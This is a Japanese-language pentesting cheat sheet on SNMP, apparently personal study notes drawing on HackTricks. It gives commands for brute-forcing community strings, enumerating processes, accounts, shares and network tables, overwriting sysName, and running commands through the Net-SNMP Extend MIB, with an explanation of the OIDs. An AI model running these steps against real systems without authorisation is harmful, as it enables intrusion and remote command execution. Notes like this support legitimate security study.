# SNMP

https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html

バージョン1～3があり、v1, v2 は認証が平文文字列になっている。  

## SNMPコミュニティ文字列スキャン

このスキャンが成功しない限り、背後にSNMPがあるかどうかも判別できない。

```sh
# SNMPコミュニティ文字列をブルートフォースで特定
onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt 
```

## 情報取得

-v2c が機能しないときは -v1 を試す。

```sh
# 全部出し
snmpwalk -c $COMM_NAME -v2c $TARGET > snmp_dump.txt
```

```sh
# システム情報
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.2.1.1        

iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.2
iso.3.6.1.2.1.1.3.0 = Timeticks: (525727) 1:27:37.27
iso.3.6.1.2.1.1.4.0 = ""
iso.3.6.1.2.1.1.5.0 = STRING: "year-of-the-owl"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
```

### プロセス

```sh
# 実行中プロセス名
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.2.1.25.4.2.1.2
```

```sh
# 実行ファイルパス
$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.25.4.2.1.4
```

```sh
# プロセスの引数
$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.25.4.2.1.5
```

```sh
# インストールソフト
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.2.1.25.6.3.1.2
```

### Windows

```sh
# Windows ローカルアカウント名一覧
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.4.1.77.1.2.25
```

```sh
# SMB共有名
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.4.1.77.1.2.27
```

```sh
# AD
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.4.1.77.1.4.1  
```

### ネットワーク

```sh
# NWインターフェース一覧
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.2.1.2.2.1.2
```

```sh
# IPアドレス
$ snmpwalk -c $COMM_NAME -v2c $TARGET 1.3.6.1.2.1.4.20.1.1
```

```sh
# ルーティングテーブル
snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.4.21
```

```sh
# ARPテーブル
snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.4.22.1.3
```

```sh
# TCPリスニングポート
snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.6.13.1.3
```

## 書き込み

```sh
# システム名（sysName）
snmpset -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.1.5.0 s "hacker"
```

```sh
# システムの連絡先（sysContact）
snmpset -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.1.4.0 s "hacker"
```

## コマンド実行（NET-SNMP-EXTEND-MIB）

書き込めることが前提条件。

```sh
# cat というコマンド名で、ls コマンドを実行
snmpset -v2c -c $COMM_NAME $TARGET \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116' s "/bin/ls -la" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116' s "/root/"
```

```sh
# 結果の回収
snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116
```

### 解説

`1.3.6.1.4.1.8072.1.3.2` は、Net-SNMP Extend MIB と呼ばれる領域のOID。

- 1.3.6.1.4.1: iso.org.dod.internet.private.enterprises（民間企業向けのツリー）
- 8072: Net-SNMP というプロジェクトに割り当てられた番号
- 1.3.2: nsExtend（外部コマンド拡張機能）のテーブル

| OIDの末尾  | MIBオブジェクト名        | 意味                                                  |
| ----------- | ----------------- | --------------------------------------------------- |
| `.2.2.1.21` | `nsExtendStatus`  | 状態管理。`4 (createAndGo)` をセットすることで、新しい行を作成し即座に有効化。 |
| `.2.2.1.2`  | `nsExtendCommand` | 実行ファイル名。実行したいプログラムのフルパスをセット。                     |
| `.2.2.1.3`  | `nsExtendArgs`    | 引数。プログラムに渡すオプションや引数をセット。                         |

99.97.116 の部分

名付けたコマンド名 "cat" のASCIIコード（名前は何でも構わない）  
Net-SNMPは、新しく作るエントリを識別するために、インデックスとして「文字列の長さ」と「各文字の数値」をOIDの末尾に付け加える。

- 3: 文字数（c-a-t は 3文字）
- 99: 'c'
- 97: 'a'
- 116: 't'

#### 結果の回収部分

- 1.3.6.1.4.1.8072.1.3.2.4.1.2: nsExtendOutLine


